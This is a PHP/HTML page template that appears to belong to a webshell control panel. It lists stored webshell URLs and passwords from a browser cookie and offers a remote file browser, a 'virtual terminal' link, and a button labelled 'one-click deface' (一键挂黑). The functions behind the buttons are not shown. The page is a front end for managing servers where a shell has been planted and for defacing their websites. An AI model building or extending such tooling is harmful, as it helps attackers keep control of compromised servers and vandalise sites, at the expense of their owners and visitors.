<div id="content" class="app-content" role="main">
    <div class="app-content-body ">
<div class="bg-light lter b-b wrapper-md hidden-print">
  <h1 class="m-n font-thin h3">文件管理</h1>
</div>
<div class="wrapper-md control">
    <div class="panel panel-default">
        <div class="panel-heading font-bold">
        文件管理
        </div>
        <div class="panel-body">
        <!--顶部-->
      <div class="row wrapper" id="top_file">
        <div class="col-sm-5 m-b-xs">
            <div class="form-group">
              <select class="input-sm form-control" id="link" name="link">
              <option value="null">请选择连接</option>
              <?php
              if (isset($_COOKIE["webshell"]))
              {
                  foreach ($_COOKIE["webshell"] as $link => $pass)
                  {
                  echo "<option value=\"".htmlentities($link)."|".htmlentities($pass)."\">链接：".htmlentities($link)." 密码：".htmlentities($pass)." </option>";
                  }
              }
              ?>
              </select>
            </div>
             <div class="form-group">
                <button class="btn btn-sm btn-primary" onclick="fileManage()" type="submit">文件管理</button>
             </div>
        </div>
      </div>
      <div class="row wrapper" id="tool" style="display:none">
        <div class="col-sm-5 m-b-xs">
            <div class="form-group">
                <button class="btn btn-sm btn-primary" onclick="alertHack()" type="submit">一键挂黑</button>
                <button class="btn btn-sm btn-success" onclick="javascript:window.location.href='?terminal'" type="submit">虚拟终端</button>
                <button class="btn btn-sm btn-danger" onclick="colseFileManage()" type="submit">关闭文件浏览器</button>
            </div>
        </div>
      </div>
      <!--顶部-->
      <!--列表-->
      <div class="form-group" id="table" style="display:none">
          <div id="path"></div>
          <div id="table_div" class="table table-responsive table-bordered">
            <table class="table table-striped">
              <thead><tr><th>名称</th><th>类型</th><th>大小</th><th>创建日期</th><th>修改日期</th><th>操作</th></tr></thead>
               <tbody id="tablebody">
               </tbody>
            </table>
          </div>
      </div>
    <!--列表-->
    </div>
  </div>
  <script type="text/javascript">
  $("#tool").hide();
  $("#table").hide();
  if(isPc()){
    $("#table_div").css({"overlow":"auto","height":"400px"});
  }else{
   
  }
  </script>